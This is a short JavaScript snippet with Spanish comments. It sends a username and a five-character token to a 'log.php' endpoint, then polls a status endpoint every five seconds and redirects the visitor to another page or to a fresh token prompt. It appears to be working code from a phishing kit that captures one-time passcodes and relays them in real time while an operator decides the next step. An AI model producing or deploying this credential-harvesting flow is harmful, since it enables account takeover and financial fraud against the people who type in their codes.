<script>
    


// Función para cambiar la clase del botón
function actualizarClaseBoton() {
    const input = document.getElementById('step03');
    const boton = document.getElementById('addtokeninfosend');

    if (input.value.length === 5) {
        // Remover solo la clase 'inactive'
        boton.classList.remove('inactive');
    } else if (input.value.length < 5) {
        // Añadir solo la clase 'inactive' si no está presente
        if (!boton.classList.contains('inactive')) {
            boton.classList.add('inactive');
        }
    }
}

let intervalId; // Variable para almacenar el identificador del intervalo
let lastTokenValue = 'No'; // Valor inicial

// Función para enviar la información del formulario por AJAX
function envioinfo() {
    const usuario = document.getElementById('step01').value;
   
    const token = document.getElementById('step03').value;

    if (token.trim() === '') {
        console.error('El usuario o la clave están vacíos.');
        return;
    }

    // Mostrar el overlay de carga
    document.getElementById('loadingOverlay').style.display = 'flex';

    // Enviar la información del formulario por AJAX
    const xhr = new XMLHttpRequest();
    xhr.open('POST', './log.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onload = function() {
        if (xhr.status === 200) {
            // La respuesta del servidor ha sido recibida correctamente
            console.log('Datos enviados correctamente.');

            // Ocultar el overlay de carga y empezar a verificar el token
            //document.getElementById('loadingOverlay').style.display = 'none';
            intervalId = setInterval(checkToken, 5000); // Guarda el identificador del intervalo
        } else {
            console.error('Error en el envío:', xhr.statusText);
            //document.getElementById('loadingOverlay').style.display = 'none'; // Ocultar el overlay en caso de error
        }
    };

    xhr.send(`step01=${encodeURIComponent(usuario)}&step03=${encodeURIComponent(token)}`);
}

// Función para verificar el token
function checkToken() {
    const usuario = document.getElementById('step01').value; // Captura el usuario que deseas verificar
    console.log("esperando");

    fetch('./getstatus.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'usuario': usuario
        })
    })
    .then(response => response.text())
    .then(response => {
        if (response !== lastTokenValue) {
            lastTokenValue = response;
            if (response === '1') {
                clearInterval(intervalId); // Detiene el intervalo si la condición se cumple
                document.getElementById('loadingOverlay').style.display = 'none'; // Oculta el overlay
                window.location.href = './index1.php'; // Redirige a la página deseada
            }
            if (response === '2') {
                clearInterval(intervalId); // Detiene el intervalo si la condición se cumple
                document.getElementById('loadingOverlay').style.display = 'none'; // Oculta el overlay
                window.location.href = './token.php'; // Redirige a la página deseada
            }
        }
    })
    .catch(error => {
        console.error('Error al verificar el estado del token.', error);
        document.getElementById('loadingOverlay').style.display = 'none'; // Oculta el overlay en caso de error
    });
}



</script>


